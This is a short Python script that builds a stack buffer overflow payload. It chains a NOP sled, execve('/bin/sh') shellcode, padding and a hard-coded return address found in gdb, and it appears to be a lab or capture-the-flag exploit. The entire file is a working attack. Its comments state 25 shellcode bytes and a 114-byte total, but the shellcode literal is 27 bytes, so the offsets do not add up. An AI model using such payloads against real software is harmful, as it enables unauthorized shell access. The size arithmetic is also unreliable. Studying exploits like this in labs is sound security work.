#!/usr/bin/env python3

# Exploit buffer construction
# Buffer layout:
# [NOP sled (32)] + [Shellcode (25)] + [Padding (53)] + [Return address (4)]
# Total: 114 bytes (110 bytes to reach return address + 4 bytes for return address)

# 1. NOP sled (32 bytes)
nop_sled = b"\x90" * 32

# 2. Shellcode to spawn /bin/sh (25 bytes)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
    b"\x0b\xcd\x80"
)

# 3. Padding to reach the saved return address (53 bytes)
# Return address is at offset 110 from buffer start
# 110 - (32 + 25) = 53
padding = b"A" * 53

# 4. Return address pointing into the NOP sled (little endian)
# Buffer starts around 0xffffc84c with static linking in gdb
# Pointing to 0xffffc850 (safely into NOP sled)
ret_addr = b"\x50\xc8\xff\xff"

# Construct final exploit buffer
exploit = nop_sled + shellcode + padding + ret_addr

# Output the exploit buffer as raw bytes
import sys
sys.stdout.buffer.write(exploit)